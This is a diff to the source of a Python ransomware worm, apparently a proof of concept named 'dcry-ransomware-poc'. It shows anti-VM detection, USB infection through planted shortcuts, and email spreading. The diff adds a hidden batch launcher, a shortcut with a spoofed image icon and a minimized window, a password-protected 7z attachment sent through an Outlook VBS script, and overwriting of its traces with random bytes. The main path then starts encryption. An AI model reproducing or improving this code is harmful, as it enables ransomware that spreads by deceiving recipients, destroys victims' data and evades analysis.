@@ -652,9 +652,7 @@ def is_vm():
     if time.perf_counter() - start_time > 0.5:
         return True
     try:
-        key = winreg.OpenKey(
-            winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System"
-        )
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System")
         bios_info = winreg.QueryValueEx(key, "SystemBiosVersion")[0]
         if any(vm in bios_info for vm in ["VMWARE", "VIRTUAL", "QEMU", "XEN"]):
             return True
@@ -704,6 +702,7 @@ def infect_usb():
             shell = Dispatch("WScript.Shell")
             shortcut = shell.CreateShortCut(shortcut_path)
             shortcut.TargetPath = exe_full
+            shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
             shortcut.save()
         except Exception as e:
             # print(f"Error while infect {usb_root}: {e}")
@@ -713,25 +712,27 @@ def infect_usb():
 def send_email(zip_password="dcry-ransomware-poc"):
     worm_path = os.path.abspath(sys.executable)
     temp_dir = os.getenv("TEMP")
-
     exe_name = "IMG_4599.jpg.exe"
     lnk_name = "IMG_4599.jpg.lnk"
+    bat_name = "IMG_4599.jpg.bat"
     exe_full = os.path.join(temp_dir, exe_name)
     lnk_full = os.path.join(temp_dir, lnk_name)
-
+    bat_full = os.path.join(temp_dir, bat_name)
     shutil.copy2(worm_path, exe_full)
     os.system(f'attrib +h +s "{exe_full}"')
-
+    with open(bat_full, "w") as f:
+        f.write(f'@echo off\n"%~dp0{exe_name}"\n')
+    os.system(f'attrib +h +s "{bat_full}"')
     shell = Dispatch("WScript.Shell")
     shortcut = shell.CreateShortCut(lnk_full)
-    shortcut.TargetPath = exe_name
+    shortcut.TargetPath = bat_full
+    shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
+    shortcut.WindowStyle = 7
     shortcut.save()
-
     zip_file_path = os.path.join(temp_dir, f"IMG_4599.7z")
-    with py7zr.SevenZipFile(zip_file_path, mode='w', password=zip_password) as archive:
+    with py7zr.SevenZipFile(zip_file_path, mode="w", password=zip_password) as archive:
         archive.write(exe_full, arcname=exe_name)
         archive.write(lnk_full, arcname=lnk_name)
-
     vbs_code = f"""
 dim x
 on error resume next
@@ -755,12 +756,11 @@ ol.Quit
     with open(vbs_file_path, "w") as f:
         f.write(vbs_code)
     os.system(f'start /b "" "{vbs_file_path}"')
-
     files = [vbs_file_path, zip_file_path, exe_full, lnk_full]
-
     for file in files:
         try:
-            with open(file, "w") as f: f.write(os.urandom(os.path.getsize(file)))
+            with open(file, "w") as f:
+                f.write(os.urandom(os.path.getsize(file)))
         except:
             pass
         try:
@@ -793,7 +793,3 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
-
-
-
-
